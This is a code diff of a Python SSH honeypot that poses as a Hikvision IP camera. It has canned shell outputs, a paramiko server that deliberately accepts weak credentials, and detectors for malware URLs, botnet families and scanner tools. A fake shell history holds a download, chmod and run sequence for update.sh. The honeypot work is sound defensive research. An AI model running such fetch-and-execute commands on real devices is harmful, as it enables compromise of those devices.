+        "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n"
+        "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n"
+        "    link/ether 44:19:b6:7a:2c:d9 brd ff:ff:ff:ff:ff:ff\n"
+    ),
+    "netstat -an": (
+        "Active Internet connections (servers and established)\n"
+        "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n"
+        "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n"
+        "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n"
+        "tcp        0      0 0.0.0.0:554             0.0.0.0:*               LISTEN\n"
+        "tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN\n"
+    ),
+    "netstat -tlnp": (
+        "Active Internet connections (only servers)\n"
+        "Proto Recv-Q Send-Q Local Address   Foreign Address  State    PID/Program\n"
+        "tcp        0      0 0.0.0.0:22      0.0.0.0:*        LISTEN   234/sshd\n"
+        "tcp        0      0 0.0.0.0:80      0.0.0.0:*        LISTEN   345/httpd\n"
+        "tcp        0      0 0.0.0.0:554     0.0.0.0:*        LISTEN   567/rtsp_server\n"
+    ),
+    "ss -tlnp": (
+        "State    Recv-Q Send-Q  Local Address:Port   Peer Address:Port\n"
+        "LISTEN   0      128           *:22            *:*      users:((\"sshd\",pid=234))\n"
+        "LISTEN   0      128           *:80            *:*      users:((\"httpd\",pid=345))\n"
+        "LISTEN   0      128           *:554           *:*      users:((\"rtsp\",pid=567))\n"
+    ),
+    "free":   (
+        "             total       used       free     shared    buffers     cached\n"
+        "Mem:        524288     396288     128000          0      16384      98304\n"
+        "-/+ buffers/cache:     281600     242688\n"
+        "Swap:            0          0          0\n"
+    ),
+    "free -m": (
+        "             total       used       free     shared    buffers     cached\n"
+        "Mem:           512        387        124          0         16         96\n"
+        "-/+ buffers/cache:        274        237\n"
+        "Swap:            0          0          0\n"
+    ),
+    "df":   (
+        "Filesystem           1K-blocks      Used Available Use% Mounted on\n"
+        "/dev/root               524288    393216    131072  75% /\n"
+        "tmpfs                   262144      1024    261120   1% /tmp\n"
+        "/dev/mtdblock5         2097152   1048576   1048576  50% /mnt/dvr\n"
+    ),
+    "df -h": (
+        "Filesystem                Size      Used Available Use% Mounted on\n"
+        "/dev/root               512.0M    384.0M    128.0M  75% /\n"
+        "tmpfs                   256.0M      1.0M    255.0M   1% /tmp\n"
+        "/dev/mtdblock5            2.0G      1.0G      1.0G  50% /mnt/dvr\n"
+    ),
+    "mount": (
+        "/dev/root on / type ext4 (ro,relatime)\n"
+        "proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\n"
+        "sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\n"
+        "tmpfs on /tmp type tmpfs (rw,relatime)\n"
+        "/dev/mtdblock5 on /mnt/dvr type ext4 (rw,relatime)\n"
+    ),
+    "dmesg": (
+        "[    0.000000] Linux version 3.10.14 (builder@hikvision)\n"
+        "[    0.000000] CPU: ARMv7 Processor [410fc075] revision 5 (ARMv7)\n"
+        "[    1.234567] Hikvision IPCamera platform initialized\n"
+        "[    2.345678] eth0: link up, 100Mbps, full-duplex\n"
+        "[    3.456789] RTSP server starting on port 554\n"
+        "[    4.567890] HTTP server starting on port 80\n"
+        "[    5.678901] Camera module initialized: DS-2CD2043G2-I\n"
+        "[    6.789012] Recording service started\n"
+        "[    7.890123] ONVIF service ready on port 8000\n"
+    ),
+    "dmesg | tail": (
+        "[    5.678901] Camera module initialized: DS-2CD2043G2-I\n"
+        "[    6.789012] Recording service started\n"
+        "[    7.890123] ONVIF service ready on port 8000\n"
+    ),
+    "top": (
+        "Mem: 396288K used, 128000K free, 16384K shrd, 98304K buff, 81920K cached\n"
+        "CPU:  1% usr  0% sys  0% nic 98% idle  0% io  0% irq  0% sirq\n"
+        "Load average: 0.12 0.08 0.05\n\n"
+        "  PID  PPID USER     STAT   VSZ %VSZ CPU %CPU COMMAND\n"
+        "  456     1 root     S     8192   1%   0  1.2 ipc_server\n"
+        "  567     1 root     S    16384   3%   0  0.8 rtsp_server\n"
+        "  234     1 root     S     3072   0%   0  0.1 sshd\n"
+    ),
+    "w": (
+        " 10:00:00 up 45 days,  3:21,  1 user,  load average: 0.12, 0.08, 0.05\n"
+        "USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT\n"
+        "root     pts/0    192.168.1.1      10:00    0.00s 0.01s  0.00s -ash\n"
+    ),
+    "last": (
+        "root     pts/0        192.168.1.1      Mon Mar 18 09:12   still logged in\n"
+        "root     pts/0        10.0.0.5         Sun Mar 17 14:33 - 14:45  (00:12)\n"
+        "reboot   system boot  3.10.14          Mon Feb  5 12:00\n"
+    ),
+    "lastlog": (
+        "Username         Port     From             Latest\n"
+        "root             pts/0    192.168.1.1      Mon Mar 18 09:12:34 +0000 2026\n"
+        "admin            pts/0    10.0.0.5         Sun Mar 17 14:33:11 +0000 2026\n"
+    ),
+    "history": (
+        "    1  ls /\n    2  cat /etc/passwd\n    3  ifconfig\n"
+        "    4  ps aux\n    5  wget http://192.168.1.200/update.sh\n"
+        "    6  chmod +x update.sh\n    7  ./update.sh\n"
+    ),
+    "cat /etc/motd":     "Welcome to Hikvision IP Camera\nFirmware: V5.7.15 build 230313\n",
+    "cat /etc/issue":    "Hikvision Embedded Linux\n",
+    "cat /etc/hostname": "IPC\n",
+    "iptables -L":       "Chain INPUT (policy ACCEPT)\nChain FORWARD (policy ACCEPT)\nChain OUTPUT (policy ACCEPT)\n",
+    "iptables -nL":      "Chain INPUT (policy ACCEPT)\nChain FORWARD (policy ACCEPT)\nChain OUTPUT (policy ACCEPT)\n",
+    "crontab -l":        "no crontab for root\n",
+    "lsmod": (
+        "Module                  Size  Used by\n"
+        "hi3516cv500_isp       524288  0\n"
+        "hi_mipi               131072  0\n"
+        "hi3516cv500_base       65536  2\n"
+    ),
+    "find / -name '*.conf' 2>/dev/null": (
+        "/etc/hikvision.conf\n/etc/resolv.conf\n/etc/network.conf\n"
+    ),
+    "find /etc -type f": (
+        "/etc/passwd\n/etc/shadow\n/etc/group\n/etc/hostname\n"
+        "/etc/issue\n/etc/motd\n/etc/hikvision.conf\n/etc/os-release\n"
+    ),
+    "cat /proc/version": (
+        "Linux version 3.10.14 (builder@hikvision) "
+        "(gcc version 4.8.3 20140320 (prerelease)) "
+        "#1 SMP PREEMPT Mon Oct 19 08:36:54 UTC 2021\n"
+    ),
+    "cat /proc/uptime": "3888000.12 3110400.09\n",
+}
 
 # ═══════════════════════════════════════════════════════════════════════════
-# SSH Protocol Implementation
+# COMMAND EXECUTION ENGINE
 # ═══════════════════════════════════════════════════════════════════════════
 
-def _ssh_packet(payload):
-    """Build SSH protocol packet"""
-    packet_len = len(payload) + 1
-    padding_len = 8 - (packet_len % 8) if packet_len % 8 else 8
-    padding = os.urandom(padding_len)
-    
-    packet = (
-        (packet_len + padding_len).to_bytes(4, 'big') +
-        padding_len.to_bytes(1, 'big') +
-        payload +
-        padding
-    )
-    return packet
-
-def _ssh_kex_init():
-    """SSH Key Exchange Init packet"""
-    cookie = os.urandom(16)
-    payload = (
-        b'\x14' +
-        cookie +
-        b'\x00\x00\x00\x45' + b'diffie-hellman-group14-sha1,diffie-hellman-group1-sha1' +
-        b'\x00\x00\x00\x07' + b'ssh-rsa' +
-        b'\x00\x00\x00\x0d' + b'aes128-cbc' +
-        b'\x00\x00\x00\x0d' + b'aes128-cbc' +
-        b'\x00\x00\x00\x09' + b'hmac-sha1' +
-        b'\x00\x00\x00\x09' + b'hmac-sha1' +
-        b'\x00\x00\x00\x04' + b'none' +
-        b'\x00\x00\x00\x04' + b'none' +
-        b'\x00\x00\x00\x00' +
-        b'\x00\x00\x00\x00' +
-        b'\x00' +
-        b'\x00\x00\x00\x00'
-    )
-    return _ssh_packet(payload)
-
-def _ssh_service_accept(service_name):
-    """SSH Service Accept"""
-    payload = b'\x06' + len(service_name).to_bytes(4, 'big') + service_name
-    return _ssh_packet(payload)
-
-def _ssh_userauth_failure(methods=b"password,publickey"):
-    """SSH UserAuth Failure"""
-    payload = b'\x33' + len(methods).to_bytes(4, 'big') + methods + b'\x00'
-    return _ssh_packet(payload)
-
-def _ssh_userauth_success():
-    """SSH UserAuth Success"""
-    return _ssh_packet(b'\x34')
-
-def _ssh_channel_open_confirmation(recipient_channel, sender_channel):
-    """SSH Channel Open Confirmation"""
-    payload = (
-        b'\x5b' +
-        recipient_channel.to_bytes(4, 'big') +
-        sender_channel.to_bytes(4, 'big') +
-        (32768).to_bytes(4, 'big') +
-        (16384).to_bytes(4, 'big')
-    )
-    return _ssh_packet(payload)
-
-def _ssh_channel_success(recipient_channel):
-    """SSH Channel Success"""
-    payload = b'\x63' + recipient_channel.to_bytes(4, 'big')
-    return _ssh_packet(payload)
-
-def _ssh_channel_data(recipient_channel, data):
-    """SSH Channel Data"""
-    if isinstance(data, str):
-        data = data.encode()
-    payload = (
-        b'\x5e' +
-        recipient_channel.to_bytes(4, 'big') +
-        len(data).to_bytes(4, 'big') +
-        data
-    )
-    return _ssh_packet(payload)
-
-def _parse_ssh_packet(data):
-    """Parse SSH packet"""
-    if len(data) < 5:
-        return None, None
-    
-    packet_len = int.from_bytes(data[0:4], 'big')
-    padding_len = data[4]
-    
-    if len(data) < packet_len + 4:
-        return None, None
-    
-    payload_len = packet_len - padding_len - 1
-    payload = data[5:5+payload_len]
-    
-    if not payload:
-        return None, None
-    
-    msg_type = payload[0]
-    msg_data = payload[1:]
-    
-    return msg_type, msg_data
-
-def _extract_string(data, offset=0):
-    """Extract SSH string"""
-    if len(data) < offset + 4:
-        return None, offset
-    
-    str_len = int.from_bytes(data[offset:offset+4], 'big')
-    if len(data) < offset + 4 + str_len:
-        return None, offset
-    
-    string = data[offset+4:offset+4+str_len]
-    return string, offset + 4 + str_len
-
-# ═══════════════════════════════════════════════════════════════════════════
-# Command Execution Engine (Expanded)
-# ═══════════════════════════════════════════════════════════════════════════
-
-def _execute_command(cmd):
-    """Execute fake shell command with IoT-specific responses"""
+def _execute(cmd: str) -> str:
     cmd = cmd.strip()
-    
     if not cmd:
         return ""
-    
-    # Check exact matches first
-    if cmd in _COMMAND_RESPONSES:
-        return _COMMAND_RESPONSES[cmd]
-    
-    # Extract command name
-    cmd_parts = cmd.split()
-    cmd_name = cmd_parts[0] if cmd_parts else cmd
-    
-    # cat commands - check for IoT files
-    if cmd_name == "cat":
-        for filepath in _IOT_FILES:
-            if filepath in cmd:
-                return _IOT_FILES[filepath]
-    
-    # ls commands with paths
-    if cmd_name in ["ls", "ll", "dir"]:
-        if "/mnt/dvr/recordings" in cmd:
-            return _IOT_FILES["/mnt/dvr/recordings/"]
-        elif "/tmp" in cmd:
-            return _IOT_FILES["/tmp/"]
-        return _COMMAND_RESPONSES.get("ls -l", _COMMAND_RESPONSES["ls"])
-    
-    # wget/curl - simulate download
-    if cmd_name in ["wget", "curl", "tftp"]:
-        return ""  # Silent success
-    
-    # chmod/chown - accept silently
-    if cmd_name in ["chmod", "chown", "chgrp"]:
+
+    # Chained commands (&&, ||, ;)
+    for sep in (" && ", " ; ", "; "):
+        if sep in cmd:
+            return "".join(_execute(p.strip()) for p in cmd.split(sep))
+
+    # Pipes — run only the first segment (we fake output anyway)
+    if " | " in cmd and cmd not in _CMD:
+        return _execute(cmd.split(" | ")[0].strip())
+
+    # Exact match
+    if cmd in _CMD:
+        return _CMD[cmd]
+
+    parts = cmd.split()
+    verb  = parts[0]
+    args  = parts[1:]
+    rest  = " ".join(args)
+
+    # ── cat ───────────────────────────────────────────────────────────────
+    if verb == "cat":
+        target = rest.strip()
+        if target in _FS:
+            return _FS[target]
+        for path, content in _FS.items():
+            if path.rstrip("/") == target.rstrip("/"):
+                return content
+        return f"cat: {target}: No such file or directory\n"
+
+    # ── ls ────────────────────────────────────────────────────────────────
+    if verb in ("ls", "ll", "dir"):
+        flags   = [a for a in args if a.startswith("-")]
+        targets = [a for a in args if not a.startswith("-")]
+        target  = (targets[-1].rstrip("/") if targets else "/root")
+
+        for dirpath, listing in _DIRS.items():
+            dp = dirpath.rstrip("/") or "/"
+            if dp == (target or "/"):
+                if any("l" in f for f in flags) or verb == "ll":
+                    lines = [f"total {random.randint(4, 64)}"]
+                    for name in listing.strip().split():
+                        lines.append(
+                            f"-rwxr-xr-x 1 root root {random.randint(512,65536):8d}"
+                            f" Mar 19 10:00 {name}"
+                        )
+                    return "\n".join(lines) + "\n"
+                return listing
+
+        if "recordings" in target:
+            return _FS.get("/mnt/dvr/recordings/", "")
+        if target in ("/tmp", "tmp"):
+            return _FS.get("/tmp/", "")
+        return _CMD.get("ls", "")
+
+    # ── echo ──────────────────────────────────────────────────────────────
+    if verb == "echo":
+        text = rest.replace('"', "").replace("'", "")
+        if " > " in text:
+            text = text.split(" > ")[0].strip()
+        return text + "\n"
+
+    # ── wget / curl / tftp ────────────────────────────────────────────────
+    if verb in ("wget", "curl", "tftp", "axel"):
         return ""
-    
-    # cd - accept silently
-    if cmd_name == "cd":
+
+    # ── silent commands ───────────────────────────────────────────────────
+    if verb in ("chmod","chown","chgrp","mkdir","rm","mv","cp","touch",
+                "kill","killall","export","unset","sync","cd","ln",
+                "crontab","sed","awk","tr","xargs"):
         return ""
-    
-    # echo
-    if cmd_name == "echo":
-        if len(cmd_parts) > 1:
-            return " ".join(cmd_parts[1:]).replace('"', '').replace("'", '') + "\r\n"
-        return "\r\n"
-    
-    # kill - accept silently
-    if cmd_name == "kill":
+
+    # ── which ─────────────────────────────────────────────────────────────
+    if verb == "which":
+        bins = {
+            "ls":"/bin/ls","cat":"/bin/cat","ps":"/bin/ps",
+            "wget":"/usr/bin/wget","curl":"/usr/bin/curl",
+            "sh":"/bin/sh","bash":"/bin/bash","id":"/usr/bin/id",
+            "whoami":"/usr/bin/whoami","find":"/usr/bin/find",
+        }
+        t = args[0] if args else ""
+        return bins.get(t, f"{t} not found\n")
+
+    # ── find ──────────────────────────────────────────────────────────────
+    if verb == "find":
+        full = " ".join(parts)
+        return _CMD.get(full, "")
+
+    # ── grep ──────────────────────────────────────────────────────────────
+    if verb == "grep":
         return ""
-    
-    # reboot/poweroff
-    if cmd_name in ["reboot", "poweroff", "halt", "shutdown"]:
-        return "The system is going down for reboot NOW!\r\n"
-    
-    # Unknown command
-    return f"{cmd_name}: command not found\r\n"
+
+    # ── shells ────────────────────────────────────────────────────────────
+    if verb in ("sh","bash","ash","/bin/sh","/bin/bash","/bin/ash","/bin/busybox"):
+        return ""
+
+    # ── python ────────────────────────────────────────────────────────────
+    if verb in ("python","python3","perl","php"):
+        return ""
+
+    # ── reboot / poweroff ─────────────────────────────────────────────────
+    if verb in ("reboot","poweroff","halt","shutdown"):
+        return "The system is going down for reboot NOW!\n"
+
+    return f"-ash: {verb}: not found\n"
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Scanner & Tool Detection
+# DETECTION HELPERS
 # ═══════════════════════════════════════════════════════════════════════════
 
-_SCANNER_SIGNATURES = {
-    "masscan": ["masscan"],
-    "nmap": ["nmap"],
-    "zgrab": ["zgrab"],
-    "shodan": ["shodan"],
-    "hydra": ["hydra"],
-    "medusa": ["medusa"],
-    "metasploit": ["metasploit"],
-    "paramiko": ["paramiko"],
-    "putty": ["putty"],
-    "libssh": ["libssh"],
-}
-
-def _detect_scanner(text):
-    """Detect scanner from SSH client string"""
-    t = text.lower()
-    for tool, signatures in _SCANNER_SIGNATURES.items():
-        if any(sig in t for sig in signatures):
-            return tool
-    return ""
-
-# ═══════════════════════════════════════════════════════════════════════════
-# Credential & Malware Detection
-# ═══════════════════════════════════════════════════════════════════════════
-
-def _validate_credentials(username, password):
-    """Check credentials"""
-    if username in WEAK_CREDENTIALS:
-        if password in WEAK_CREDENTIALS[username]:
-            return True
-    return False
-
-def _detect_malware_url(cmd):
-    """Detect malware download URLs"""
+def _detect_malware_url(cmd: str):
     patterns = [
         r"(https?://\S+\.(?:sh|elf|bin|arm|mips|x86|arm7|arm5|m68k|ppc|mpsl|mipsel))\b",
         r"(?:wget|curl|tftp\s+-g)\s+(https?://\S+)",
@@ -599,399 +581,392 @@ def _detect_malware_url(cmd):
             return m.group(1)
     return None
 
-def _detect_arch(cmd_str):
-    """Detect architecture"""
-    for a in ["arm7", "arm6", "arm5", "arm", "mips", "mipsel", "mpsl", "x86", "i686", "ppc", "m68k", "sh4"]:
-        if a in cmd_str.lower():
+def _detect_arch(cmd: str) -> str:
+    for a in ["arm7","arm6","arm5","arm","mips","mipsel","mpsl",
+              "x86","i686","ppc","m68k","sh4","sparc"]:
+        if a in cmd.lower():
             return a
     return "unknown"
 
-def _detect_botnet_family(cmd_str):
-    """Detect botnet family"""
+def _detect_botnet(cmd: str) -> str:
     families = {
-        "Mirai":   ["busybox", "ECCHI", "/bin/busybox"],
-        "Gafgyt":  ["HTTPFLOOD", "tftp -g"],
-        "Mozi":    ["mozi", "nttpd"],
-        "Muhstik": ["muhstik", "irc"],
+        "Mirai":   ["busybox","ecchi","/bin/busybox","cat /proc/cpuinfo"],
+        "Gafgyt":  ["httpflood","udpflood","tftp -g","junk"],
+        "Mozi":    ["mozi","nttpd","dht"],
+        "Muhstik": ["muhstik","join #","irc"],
+        "Sora":    ["sora","/bin/busybox sora"],
     }
-    s = cmd_str.lower()
+    s = cmd.lower()
     for fam, indicators in families.items():
-        if any(ind.lower() in s for ind in indicators):
+        if any(ind in s for ind in indicators):
             return fam
     return "Unknown"
 
+_SCANNERS = {
+    "masscan":["masscan"],"nmap":["nmap"],"zgrab":["zgrab"],
+    "shodan":["shodan"],"hydra":["hydra"],"medusa":["medusa"],
+    "metasploit":["metasploit"],"paramiko":["paramiko"],
+    "putty":["putty"],"libssh":["libssh"],"ncrack":["ncrack"],
+}
+
+def _detect_scanner(text: str) -> str:
+    t = text.lower()
+    for tool, sigs in _SCANNERS.items():
+        if any(s in t for s in sigs):
+            return tool
+    return ""
+
 # ═══════════════════════════════════════════════════════════════════════════
-# Main SSH Handler (ULTIMATE VERSION)
+# SESSION REPLAY DATABASE
 # ═══════════════════════════════════════════════════════════════════════════
 
-def handle_ssh(conn, addr, log_attack=None, geoip_func=None, intel_fields_func=None, new_ip_alert=None):
-    """
-    ULTIMATE SSH honeypot handler with advanced IoT features
-    """
-    ip, port = addr
-    
-    # ─── Rate Limiting / Tarpit ───────────────────────────────────────────
-    is_tarpitted = _should_tarpit(ip)
-    
-    if is_tarpitted and log_attack:
-        log_attack(ip, 22, "SSH_TARPIT", json.dumps({
-            "event": "tarpitted",
-            "reason": "excessive_connections_or_failed_auth",
-        }))
-    
-    # Session tracking
-    session = {
-        "authenticated": False,
-        "username": "",
-        "password": "",
-        "auth_attempts": 0,
-        "commands": [],
-        "start_time": time.time(),
-        "client_version": "",
-        "channel_open": False,
-        "recipient_channel": 0,
-        "is_tarpitted": is_tarpitted,
-        "is_replay": False,
-    }
-    
-    try:
-        # Get geo data
-        gdata = geoip_func(ip) if geoip_func else {}
-        
-        # Initial connection log
-        if log_attack:
-            log_attack(ip, 22, "SSH_CONNECT", json.dumps({
-                "event": "connection",
-                "country": gdata.get("country", "Unknown"),
-                "city": gdata.get("city", ""),
-                "is_tarpitted": is_tarpitted,
+_replay_db: list = []
+_MAX_REPLAYS = 50
+
+def _save_replay(session: dict):
+    if len(session.get("commands", [])) >= 3:
+        _replay_db.append({
+            "username": session.get("username"),
+            "password": session.get("password"),
+            "commands": list(session.get("commands", [])),
+        })
+        if len(_replay_db) > _MAX_REPLAYS:
+            _replay_db.pop(0)
+
+# ═══════════════════════════════════════════════════════════════════════════
+# PARAMIKO SERVER INTERFACE
+# ═══════════════════════════════════════════════════════════════════════════
+
+class _HoneypotServer(paramiko.ServerInterface):
+
+    def __init__(self, ip: str, log_attack, session: dict):
+        self.ip         = ip
+        self.log_attack = log_attack
+        self.session    = session
+        self.shell_ev   = threading.Event()
+        self.exec_cmd   = None
+
+    def check_channel_request(self, kind, chanid):
+        return (paramiko.OPEN_SUCCEEDED if kind == "session"
+                else paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED)
+
+    def check_auth_password(self, username: str, password: str):
+        self.session["username"]       = username
+        self.session["password"]       = password
+        self.session["auth_attempts"] += 1
+
+        is_valid = (username in WEAK_CREDENTIALS and
+                    password in WEAK_CREDENTIALS.get(username, []))
+
+        if self.log_attack:
+            self.log_attack(self.ip, 22, "SSH_AUTH_ATTEMPT", json.dumps({
+                "username":   username,
+                "password":   password,
+                "attempt":    self.session["auth_attempts"],
+                "valid_cred": is_valid,
             }))
-        
-        # Alert on new IP
-        if new_ip_alert and gdata:
-            new_ip_alert(ip, gdata.get("country", ""), gdata.get("city", ""), "ssh")
-        
-        # Tarpit delay
-        if is_tarpitted:
-            time.sleep(TARPIT_DELAY_PER_PACKET * 2)
-        else:
-            time.sleep(random.uniform(0.08, 0.22))
-        
-        # Send SSH banner
-        banner = random.choice(_SSH_BANNERS)
-        conn.sendall(banner)
-        
-        # Tarpit delay
-        if is_tarpitted:
-            time.sleep(TARPIT_DELAY_PER_PACKET)
-        
-        # Receive client version
-        conn.settimeout(10 if not is_tarpitted else 30)
-        try:
-            client_banner = conn.recv(512)
-            if client_banner:
-                session["client_version"] = client_banner.decode(errors="ignore").strip()
-                
-                # Detect scanner
-                scanner = _detect_scanner(session["client_version"])
-                
-                # Log with SSH host key fingerprint
-                if log_attack:
-                    log_attack(ip, 22, "SSH_BANNER_EXCHANGE", json.dumps({
-                        "client_version": session["client_version"][:200],
-                        "server_version": banner.decode().strip(),
-                        "host_key_fingerprint": _get_ssh_host_key_fingerprint(),
-                        "scanner_tool": scanner,
-                    }))
-        except socket.timeout:
-            return
-        
-        # Send Key Exchange Init
-        conn.sendall(_ssh_kex_init())
-        
-        # Tarpit delay
-        if is_tarpitted:
-            time.sleep(TARPIT_DELAY_PER_PACKET)
-        
-        # ─── Session Replay (5% chance) ───────────────────────────────────
-        replay_session = None
-        if _should_replay_session():
-            replay_session = _get_replay_session()
-            if replay_session:
-                session["is_replay"] = True
-                if log_attack:
-                    log_attack(ip, 22, "SSH_SESSION_REPLAY", json.dumps({
-                        "original_username": replay_session["username"],
-                        "original_commands": replay_session["commands"],
-                    }))
-        
-        # Process authentication and commands
-        for _ in range(50):
+
+        # Realistic delay — slows brute-force
+        time.sleep(random.uniform(0.6, 1.8))
+
+        accept = False
+        if is_valid:
+            if self.session["auth_attempts"] >= 2 or random.random() < 0.10:
+                accept = True
+
+        if accept:
+            self.session["authenticated"] = True
+            if self.log_attack:
+                self.log_attack(self.ip, 22, "SSH_AUTH_SUCCESS", json.dumps({
+                    "username": username,
+                    "password": password,
+                    "attempts": self.session["auth_attempts"],
+                }))
+            return paramiko.AUTH_SUCCESSFUL
+
+        _failed_tracker[self.ip] += 1
+        return paramiko.AUTH_FAILED
+
+    def check_auth_publickey(self, username: str, key):
+        if self.log_attack:
+            self.log_attack(self.ip, 22, "SSH_PUBKEY_ATTEMPT", json.dumps({
+                "username": username,
+                "key_type": key.get_name(),
+                "key_fp":   key.get_fingerprint().hex(),
+            }))
+        return paramiko.AUTH_FAILED
+
+    def get_allowed_auths(self, username: str) -> str:
+        return "password,publickey"
+
+    def check_channel_pty_request(self, channel, term, width, height,
+                                   pixelwidth, pixelheight, modes):
+        return True
+
+    def check_channel_shell_request(self, channel):
+        self.shell_ev.set()
+        return True
+
+    def check_channel_exec_request(self, channel, command: bytes):
+        self.exec_cmd = command.decode(errors="ignore")
+        self.shell_ev.set()
+        return True
+
+    def check_channel_subsystem_request(self, channel, name: str):
+        return False
+
+    def check_channel_window_change_request(self, channel, width, height,
+                                             pixelwidth, pixelheight):
+        return True
+
+# ═══════════════════════════════════════════════════════════════════════════
+# INTERACTIVE SHELL
+# ═══════════════════════════════════════════════════════════════════════════
+
+def _run_shell(channel, session: dict, ip: str, log_attack, is_tarpitted: bool):
+    prompt = random.choice(_PROMPTS)
+    buf    = ""
+
+    channel.send(
+        b"\r\nWelcome to Hikvision IP Camera\r\n"
+        b"Firmware: V5.7.15 build 230313\r\n"
+        b"Model: DS-2CD2043G2-I\r\n\r\n"
+    )
+    time.sleep(0.05)
+    channel.send(prompt.encode())
+    channel.settimeout(180)
+
+    try:
+        while True:
             try:
-                conn.settimeout(30 if not is_tarpitted else 60)
-                data = conn.recv(8192)
-                if not data:
-                    break
-                
-                # Tarpit delay
-                if is_tarpitted:
-                    time.sleep(TARPIT_DELAY_PER_PACKET)
-                
-                msg_type, msg_data = _parse_ssh_packet(data)
-                
-                if msg_type is None:
-                    continue
-                
-                # SSH_MSG_KEXINIT (20)
-                if msg_type == 20:
-                    pass
-                
-                # SSH_MSG_SERVICE_REQUEST (5)
-                elif msg_type == 5:
-                    service_name, _ = _extract_string(msg_data)
-                    if service_name:
-                        conn.sendall(_ssh_service_accept(service_name))
-                        if is_tarpitted:
-                            time.sleep(TARPIT_DELAY_PER_PACKET)
-                
-                # SSH_MSG_USERAUTH_REQUEST (50)
-                elif msg_type == 50:
-                    username, offset = _extract_string(msg_data)
-                    service_name, offset = _extract_string(msg_data, offset)
-                    method_name, offset = _extract_string(msg_data, offset)
-                    
-                    if username:
-                        username = username.decode(errors="ignore")
-                    if method_name:
-                        method_name = method_name.decode(errors="ignore")
-                    
-                    session["username"] = username
-                    session["auth_attempts"] += 1
-                    
-                    # Password authentication
-                    if method_name == "password":
-                        password, _ = _extract_string(msg_data, offset + 1)
-                        if password:
-                            password = password.decode(errors="ignore")
-                            session["password"] = password
-                        
-                        is_valid = _validate_credentials(username, password)
-                        
-                        # Log authentication attempt
-                        if log_attack:
-                            log_attack(ip, 22, "SSH_AUTH_ATTEMPT", json.dumps({
-                                "username": username,
-                                "password": password,
-                                "method": method_name,
-                                "attempt": session["auth_attempts"],
-                                "success": False,
-                                "is_tarpitted": is_tarpitted,
-                            }))
-                        
-                        # Accept after 2nd attempt or if using replay credentials
-                        accept_auth = False
-                        if session["auth_attempts"] >= 2 and is_valid:
-                            accept_auth = True
-                        elif is_valid and random.random() < 0.1:  # 10% chance immediate success
-                            accept_auth = True
-                        elif replay_session and username == replay_session["username"]:
-                            accept_auth = True
-                        
-                        if accept_auth:
-                            session["authenticated"] = True
-                            conn.sendall(_ssh_userauth_success())
-                            
-                            if log_attack:
-                                log_attack(ip, 22, "SSH_AUTH_SUCCESS", json.dumps({
-                                    "username": username,
-                                    "password": password,
-                                    "attempts": session["auth_attempts"],
-                                    "is_replay": session["is_replay"],
-                                }))
-                            
-                            if is_tarpitted:
-                                time.sleep(TARPIT_DELAY_PER_PACKET)
-                        else:
-                            # Track failed auth for tarpit
-                            _failed_auth_tracker[ip] += 1
-                            
-                            conn.sendall(_ssh_userauth_failure())
-                            if is_tarpitted:
-                                time.sleep(TARPIT_DELAY_PER_PACKET * 3)
-                    
-                    # Public key
-                    elif method_name == "publickey":
-                        if log_attack:
-                            log_attack(ip, 22, "SSH_PUBKEY_ATTEMPT", json.dumps({
-                                "username": username,
-                            }))
-                        conn.sendall(_ssh_userauth_failure(b"password"))
-                
-                # SSH_MSG_CHANNEL_OPEN (90)
-                elif msg_type == 90 and session["authenticated"]:
-                    channel_type, offset = _extract_string(msg_data)
-                    if len(msg_data) >= offset + 12:
-                        sender_channel = int.from_bytes(msg_data[offset:offset+4], 'big')
-                        session["recipient_channel"] = sender_channel
-                        session["channel_open"] = True
-                        
-                        conn.sendall(_ssh_channel_open_confirmation(sender_channel, 0))
-                        if is_tarpitted:
-                            time.sleep(TARPIT_DELAY_PER_PACKET)
-                
-                # SSH_MSG_CHANNEL_REQUEST (98)
-                elif msg_type == 98 and session["channel_open"]:
-                    recipient_channel = int.from_bytes(msg_data[0:4], 'big')
-                    request_type, offset = _extract_string(msg_data, 4)
-                    
-                    if request_type:
-                        request_type = request_type.decode(errors="ignore")
-                    
-                    if request_type in ["pty-req", "shell"]:
-                        conn.sendall(_ssh_channel_success(recipient_channel))
-                        
-                        if request_type == "shell":
-                            prompt = random.choice(_PROMPTS)
-                            conn.sendall(_ssh_channel_data(recipient_channel, prompt))
-                        
-                        if is_tarpitted:
-                            time.sleep(TARPIT_DELAY_PER_PACKET)
-                    
-                    # exec request
-                    elif request_type == "exec":
-                        command, _ = _extract_string(msg_data, offset + 1)
-                        if command:
-                            command = command.decode(errors="ignore")
-                            session["commands"].append(command)
-                            
-                            # ─── Session Replay: Use replay commands ──────
-                            if replay_session and len(session["commands"]) <= len(replay_session["commands"]):
-                                output = _execute_command(command)
-                            else:
-                                output = _execute_command(command)
-                            
-                            # Detect malware
-                            mal_url = _detect_malware_url(command)
-                            if mal_url and log_attack:
-                                arch = _detect_arch(command)
-                                family = _detect_botnet_family(" ".join(session["commands"]))
-                                log_attack(ip, 22, "SSH_MALWARE", json.dumps({
-                                    "url": mal_url,
-                                    "command": command,
-                                    "arch": arch,
-                                    "family": family,
-                                }))
-                            
-                            # Log command
-                            if log_attack:
-                                log_attack(ip, 22, "SSH_COMMAND", json.dumps({
-                                    "command": command,
-                                    "username": session["username"],
-                                }))
-                            
-                            # Check for honeytokens
-                            for honeytoken_file in _IOT_FILES:
-                                if honeytoken_file in command:
-                                    if log_attack:
-                                        log_attack(ip, 22, "SSH_HONEYTOKEN", json.dumps({
-                                            "file": honeytoken_file,
-                                            "command": command,
-                                        }))
-                            
-                            if output:
-                                conn.sendall(_ssh_channel_data(recipient_channel, output))
-                            
-                            conn.sendall(_ssh_channel_success(recipient_channel))
-                            
-                            if is_tarpitted:
-                                time.sleep(TARPIT_DELAY_PER_PACKET)
-                
-                # SSH_MSG_CHANNEL_DATA (94)
-                elif msg_type == 94 and session["channel_open"]:
-                    recipient_channel = int.from_bytes(msg_data[0:4], 'big')
